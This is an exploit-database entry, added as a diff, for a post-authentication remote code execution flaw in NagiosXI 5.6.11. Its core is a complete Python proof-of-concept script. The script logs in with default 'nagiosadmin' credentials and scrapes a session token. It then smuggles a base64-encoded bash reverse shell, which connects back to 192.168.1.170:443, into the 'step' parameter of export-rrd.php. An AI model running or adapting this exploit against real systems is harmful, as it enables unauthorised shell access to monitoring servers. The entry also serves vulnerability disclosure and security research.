@@ -1,0 +1,79 @@
+id: 34214
+date: 04/09/2020
+title: NagiosXI 5.6.11 start / end / step Remote Code Execution Exploit
+author: Cody Sixteen
+cves: 
+
+# Title: Postauth RCE in NagiosXI 5.6.11 
+# Vendor: www.nagios.com
+# Vulnerable software: https://www.nagios.com/downloads/nagios-xi/vmware/
+# Repo: https://github.com/c610/free/
+
+
+c@kali:~/src/eonila/nagiospox$ cat nagiospox.py
+#!/usr/bin/env python
+# nagiospox.py - small poc for nagiosxi rce
+# 19.03.2020 by code610
+#
+# more : https://twitter.com/CodySixteen
+#        https://code610.blogspot.com
+#
+import sys, re
+import requests
+
+target = sys.argv[1]
+our_user = 'nagiosadmin'
+our_pass = 'nagiosadmin'
+
+def main():
+  print 'nagios rce poc - vs - %s' % ( target )
+
+  sess = requests.session()
+
+  baseUrl = target + ':80/nagiosxi/'
+  checkBaseUrl = sess.get(baseUrl)
+  checkBaseResp = checkBaseUrl.text
+
+  #print checkBaseResp
+  nsp_patt = "var nsp_str = \"(.*?)\""
+
+  find_nsp = re.compile(nsp_patt)
+  found_nsp = re.search(find_nsp, checkBaseResp)
+  if found_nsp:
+    nsp_val = found_nsp.group(1)
+    print 'nsp value found: %s' % ( nsp_val )
+
+    # we will use nsp value in next login request
+    loginurl = baseUrl + '/login.php' # ?redirect=/nagiosxi/index.php%3f&noauth=1'
+    data_login = {
+      'nsp': nsp_val,
+      'page': 'auth',
+      'debug':'',
+      'pageopt':'login',
+      'redirect':'http://192.168.1.10/nagiosxi/index.php', # %2Fnagiosxi%2Findex.php%3F',
+      'username':our_user,
+      'password':our_pass,
+      'loginButton':''
+    }
+    req = sess.post(loginurl, data=data_login, verify=False, allow_redirects=True)
+    resp_code = req.status_code
+    resp = req.text
+
+    #print resp_code
+    #print resp
+    if resp_code == 200:
+      print '3rd request now!'
+      sh = "a|(echo+\"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTcwLzQ0MyAwPiYx\"|base64+-d+-|sh+-i);#"
+      shellcode_req = baseUrl + '/includes/components/xicore/export-rrd.php?host=localhost&service=Root%20Partition&start=1584108670&end=1584195130&step=' + sh + '&type=a&nsp=' + nsp_val
+      dosh = sess.get(shellcode_req, verify=False, allow_redirects=True)
+      donesh = dosh.text
+
+      print donesh
+
+
+# run me:
+if __name__ == '__main__':
+  main()
+c@kali:~/src/eonila/nagiospox$
+
+#  0day.today [2023-03-25]  #
